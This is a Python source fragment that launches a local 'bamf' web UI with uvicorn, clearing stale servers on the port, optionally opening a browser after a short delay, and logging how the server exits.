def _open_browser_later(host: str, port: int) -> None:
    url = f"http://{host}:{port}"
    if host == "0.0.0.0":
        url = f"http://127.0.0.1:{port}"

    timer = threading.Timer(1.0, lambda: webbrowser.open(url))
    timer.daemon = True
    timer.start()


def run_server(host: str = SERVER_HOST, port: int = SERVER_PORT, open_browser: bool = False) -> None:
    import uvicorn

    logger.info("Checking for stale bamf web servers on port %s", port)
    _stop_stale_web_servers(port)
    logger.info("Starting bamf web UI at http://%s:%s", host, port)
    if open_browser:
        _open_browser_later(host, port)
    try:
        uvicorn.run(app, host=host, port=port, log_level="debug", access_log=False, log_config=None)
    except KeyboardInterrupt:
        logger.info("Server stopped by keyboard interrupt")
        raise
    except BaseException:
        logger.exception("Server process crashed during uvicorn.run")
        raise
    finally:
        logger.warning("uvicorn.run returned; server process is exiting")


if __name__ == "__main__":
    run_server()
